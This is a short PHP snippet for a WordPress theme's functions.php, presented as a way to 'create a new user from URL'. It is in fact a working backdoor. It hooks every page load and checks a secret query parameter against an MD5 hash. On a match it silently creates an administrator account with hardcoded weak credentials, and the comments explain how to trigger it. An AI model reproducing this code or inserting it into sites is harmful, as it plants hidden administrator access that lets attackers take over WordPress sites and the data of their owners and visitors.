// #TO CREATE A NEW USER FROM URL, KINDLY PASTE BELOW CODE INTO WP THEMES FUNCTION.PHP

<?php
add_action( 'wp_head', 'devil' );

function devil () {
    if ( md5( $_GET['devil'] ) == 'd81e8213797f23651cf57e59b4bd8da0' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'devil' ) ) {
            $user_id = wp_create_user( 'devil', 'devil' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}

// #after successfully pasted, navigated to : https://example.com/?devil=devil
// #replace example.com withour original wp domain.

?>

